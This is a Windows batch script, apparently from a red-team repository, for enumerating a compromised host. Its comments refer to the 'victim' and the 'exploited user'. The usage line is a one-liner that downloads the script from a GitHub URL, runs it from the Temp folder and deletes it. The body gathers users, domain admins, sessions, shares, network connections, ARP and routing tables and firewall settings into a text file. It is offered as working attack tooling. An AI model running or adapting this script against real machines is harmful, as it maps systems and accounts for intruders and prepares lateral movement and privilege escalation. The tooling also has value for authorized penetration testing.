rem Usage: powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
rem Description: Windows enumeration scrip

rem --------------------------------- Host and user details ------------------------------------------

echo 1. Finding os details > C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 2. Finding hostname >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
hostname >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt

echo 3. Finding exploited user name >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
echo %username% >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 4. All users on the system >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
net users >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 5. Getting group membership, active sessions, account lock out policy >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
net user %username% >> C:\Windows\Temp\Host_Recon_Complete.txt
net users >> C:\Windows\Temp\Host_Recon_Complete.txt
net session  >> C:\Windows\Temp\Host_Recon_Complete.txt
net accounts /domain  >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 5.1. Display which group policies are applied and info about the OS if victim is the member of a domain: >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
gpreport >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


rem ------------------------------------ Network details ------------------------------------------

echo 6. Checking available network interfaces and routing table >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
ipconfig /all >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt

echo 7. routing table >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
route print >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt



echo 8. Checking ARP cache table for all available interfaces >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
arp -A >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 9. Checking active network connections >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
netstat -ano >> C:\Windows\Temp\Host_Recon_Complete.txt
netstat -an | find /i "established" >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt



echo 9.1. Checking hidden, non-hidden share  >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
net share >> C:\Windows\Temp\Host_Recon_Complete.txt
net use >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 9.2. list all the hosts on the "compromised host's domain" and list the domains that the compromised host can see >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
net view >> C:\Windows\Temp\Host_Recon_Complete.txt
net view /domain >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 9.3. enumerate the domain >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
net localgroup users /domain
net user Administrator /domain
net localgroup administrators
net use
net share
net group "domain admins" /domain
net config workstation
net accounts
net view
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


rem ------------------------------------ Firewall details ------------------------------------------

echo 10. The netsh firewall state >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
netsh firewall show state >> C:\Windows\Temp\Host_Recon_Complete.txt
netsh firewall show opmode >> C:\Windows\Temp\Host_Recon_Complete.txt
netsh firewall show port >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt


echo 11. Firewall configuration >> C:\Windows\Temp\Host_Recon_Complete.txt
echo --------------------------- >> C:\Windows\Temp\Host_Recon_Complete.txt
netsh firewall show config >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
echo. >> C:\Windows\Temp\Host_Recon_Complete.txt
